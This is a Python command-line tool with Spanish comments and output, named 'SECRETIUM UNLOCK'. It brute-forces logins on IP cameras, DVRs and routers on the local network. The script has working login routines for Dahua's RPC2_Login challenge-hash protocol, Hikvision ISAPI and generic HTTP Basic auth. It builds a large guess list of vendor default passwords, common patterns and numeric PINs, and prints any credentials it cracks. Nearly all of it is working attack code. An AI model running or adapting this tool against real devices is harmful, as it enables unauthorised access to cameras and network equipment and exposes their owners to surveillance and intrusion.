#!/usr/bin/env python3
"""
SECRETIUM UNLOCK — Bruteforce Local
Ejecuta esto en un PC conectado a la MISMA RED que el dispositivo.

USO:
  python bruteforce_local.py --ip 192.168.1.101 --brand dahua
  python bruteforce_local.py --ip 192.168.1.1 --brand generic --port 80
  python bruteforce_local.py --ip 192.168.1.101 --brand hikvision --users admin,root

REQUIERE: Python 3.6+, no necesita instalar nada extra.
"""
import sys, hashlib, json, time, argparse, os
from urllib.request import urlopen, Request
from urllib.error import URLError, HTTPError
from base64 import b64encode
from concurrent.futures import ThreadPoolExecutor, as_completed

# ============================================================
# LOGIN FUNCTIONS PER BRAND
# ============================================================

def try_http_basic(ip, port, user, pw, timeout=2):
    """Generic HTTP Basic Auth"""
    try:
        creds = b64encode(f"{user}:{pw}".encode()).decode()
        req = Request(f"http://{ip}:{port}/",
                     headers={"Authorization": f"Basic {creds}"})
        resp = urlopen(req, timeout=timeout)
        return resp.getcode() in [200, 301, 302]
    except HTTPError as e:
        return e.code not in [401, 403]
    except:
        return False

def try_dahua(ip, port, user, pw, timeout=3):
    """Dahua RPC2_Login protocol"""
    try:
        url = f"http://{ip}:{port}/RPC2_Login"
        # Step 1: challenge
        p1 = json.dumps({"method":"global.login",
              "params":{"userName":user,"password":"","clientType":"Web3.0"},"id":1})
        req1 = Request(url, data=p1.encode(),
                      headers={"Content-Type":"application/json"})
        r1 = json.loads(urlopen(req1, timeout=timeout).read())
        params = r1.get("params", {})
        realm = params.get("realm", "")
        rand = params.get("random", "")
        session = r1.get("session", "")
        if not realm or not rand:
            return False

        # Step 2: hash
        ha1 = hashlib.md5(f"{user}:{realm}:{pw}".encode()).hexdigest().upper()
        final = hashlib.md5(f"{user}:{rand}:{ha1}".encode()).hexdigest().upper()

        # Step 3: login
        p2 = json.dumps({"method":"global.login",
              "params":{"userName":user,"password":final,
                        "clientType":"Web3.0","authorityType":"Default"},
              "id":2,"session":session})
        req2 = Request(url, data=p2.encode(),
                      headers={"Content-Type":"application/json"})
        r2 = json.loads(urlopen(req2, timeout=timeout).read())
        return r2.get("result", False)
    except:
        return False

def try_hikvision(ip, port, user, pw, timeout=2):
    """Hikvision ISAPI"""
    try:
        creds = b64encode(f"{user}:{pw}".encode()).decode()
        req = Request(f"http://{ip}:{port}/ISAPI/System/deviceInfo",
                     headers={"Authorization": f"Basic {creds}"})
        resp = urlopen(req, timeout=timeout)
        return resp.getcode() == 200
    except HTTPError as e:
        return e.code not in [401, 403]
    except:
        return False

# ============================================================
# PASSWORD GENERATOR
# ============================================================

def generate_passwords():
    """Generate comprehensive password list"""
    passwords = []

    # 1. Top defaults
    defaults = [
        "admin", "admin123", "888888", "666666", "123456", "12345",
        "1234", "password", "admin1234", "admin12345", "root", "pass",
        "1234567890", "qwerty", "abc123", "111111", "000000", "master",
        "changeme", "default", "supervisor", "support", "service",
        "P@ssw0rd", "passw0rd", "Admin123", "Password1", "welcome",
    ]
    passwords.extend(defaults)

    # 2. Brand-specific (Dahua)
    dahua = ["admin", "admin123", "888888", "666666", "123456", "Admin123",
             "admin888", "ADMIN", "admin1", "admin12", "admin1234", "admin12345",
             "7ujMko0admin", "7ujMko0", "888888888", "666666666"]
    for p in dahua:
        if p not in passwords:
            passwords.append(p)

    # 3. Hikvision
    hik = ["12345", "hiklinux", "Hikvision", "abcdef", "hikadmin",
           "hik12345", "hik123", "hikvision123", "admin12345"]
    for p in hik:
        if p not in passwords:
            passwords.append(p)

    # 4. Common patterns
    for base in ["admin", "password", "camera", "dvr", "cctv", "video",
                 "security", "user", "root", "guest", "test", "monitor",
                 "viewer", "operator", "installer", "super"]:
        for suf in ["", "1", "12", "123", "1234", "12345", "!", "@",
                    "2024", "2025", "2026", "01", "00", "99"]:
            pw = base + suf
            if pw not in passwords:
                passwords.append(pw)

    # 5. Numeric
    for i in range(10000):
        passwords.append(f"{i:04d}")
    for i in range(0, 1000000, 7):
        passwords.append(f"{i:06d}")

    # 6. Keyboard patterns
    for p in ["qwerty", "qwerty123", "1q2w3e4r", "1qaz2wsx", "zaq12wsx",
              "asdfghjkl", "qwertyuiop", "zxcvbnm", "1234qwer", "qwer1234"]:
        if p not in passwords:
            passwords.append(p)

    return passwords

# ============================================================
# MAIN
# ============================================================

def main():
    parser = argparse.ArgumentParser(description="SECRETIUM UNLOCK — Bruteforce Local")
    parser.add_argument("--ip", required=True, help="IP del dispositivo (ej: 192.168.1.101)")
    parser.add_argument("--port", type=int, default=80, help="Puerto (default: 80)")
    parser.add_argument("--brand", default="dahua", help="Marca: dahua, hikvision, generic")
    parser.add_argument("--users", default="admin", help="Usuarios separados por coma")
    parser.add_argument("--threads", type=int, default=1, help="Hilos paralelos (default: 1, cuidado con bloqueos)")
    parser.add_argument("--dict", help="Archivo de diccionario adicional")
    args = parser.parse_args()

    users = [u.strip() for u in args.users.split(",")]

    # Select login function
    if args.brand == "dahua":
        login_fn = try_dahua
        brand_name = "Dahua (RPC2_Login)"
    elif args.brand == "hikvision":
        login_fn = try_hikvision
        brand_name = "Hikvision (ISAPI)"
    else:
        login_fn = try_http_basic
        brand_name = "Generic (HTTP Basic)"

    # Build password list
    passwords = generate_passwords()

    # Load extra dictionary
    if args.dict and os.path.exists(args.dict):
        with open(args.dict) as f:
            for line in f:
                pw = line.strip()
                if pw and pw not in passwords:
                    passwords.append(pw)

    print("=" * 60)
    print("  SECRETIUM UNLOCK — BRUTEFORCE LOCAL")
    print("=" * 60)
    print(f"  Target:    {args.ip}:{args.port}")
    print(f"  Brand:     {brand_name}")
    print(f"  Users:     {users}")
    print(f"  Passwords: {len(passwords):,}")
    print(f"  Threads:   {args.threads}")
    print("=" * 60)
    print()

    # Quick connectivity test
    print("[*] Comprobando conexion...")
    try:
        req = Request(f"http://{args.ip}:{args.port}/", method="GET")
        urlopen(req, timeout=5)
        print(f"[OK] Dispositivo accesible en {args.ip}:{args.port}")
    except HTTPError:
        print(f"[OK] Dispositivo responde en {args.ip}:{args.port}")
    except Exception as e:
        print(f"[!] No se puede conectar a {args.ip}:{args.port}: {e}")
        print("[!] Asegurate de estar en la misma red WiFi que el dispositivo")
        sys.exit(1)

    print()
    print("[*] Empezando bruteforce...")
    start = time.time()
    found = False
    tried = 0
    total = len(users) * len(passwords)

    for user in users:
        if found:
            break
        print(f"\n[*] Probando usuario: {user}")
        for pw in passwords:
            tried += 1
            if tried % 100 == 0:
                elapsed = time.time() - start
                speed = tried / max(elapsed, 0.1)
                pct = 100 * tried / total
                eta = (total - tried) / max(speed, 0.1)
                print(f"    [{pct:.1f}%] {tried:,}/{total:,} | {speed:.1f} pw/s | ETA: {eta/60:.0f}min | Ultima: {pw}", end="\r")

            try:
                if login_fn(args.ip, args.port, user, pw, timeout=3):
                    elapsed = time.time() - start
                    print()
                    print()
                    print("!" * 60)
                    print("  CONTRASENA ENCONTRADA!")
                    print("!" * 60)
                    print(f"  Usuario:  {user}")
                    print(f"  Password: {pw}")
                    print(f"  Target:   {args.ip}:{args.port}")
                    print(f"  Intentos: {tried:,}")
                    print(f"  Tiempo:   {elapsed:.1f} segundos")
                    print("!" * 60)
                    print()
                    print(f"  Accede a: http://{args.ip}:{args.port}")
                    print(f"  Usuario:  {user}")
                    print(f"  Password: {pw}")
                    print()
                    found = True
                    break
            except KeyboardInterrupt:
                print("\n[!] Cancelado por el usuario")
                sys.exit(0)
            except:
                pass

    if not found:
        elapsed = time.time() - start
        print()
        print()
        print("-" * 60)
        print(f"  Completado. {tried:,} contrasenas probadas en {elapsed:.1f}s")
        print(f"  No se encontro la contrasena.")
        print(f"  Sugerencias:")
        print(f"    1. Prueba con otro usuario: --users admin,root,888888")
        print(f"    2. Anade diccionario: --dict passwords.txt")
        print(f"    3. Reset fisico del dispositivo (boton 15 seg)")
        print("-" * 60)


if __name__ == "__main__":
    main()
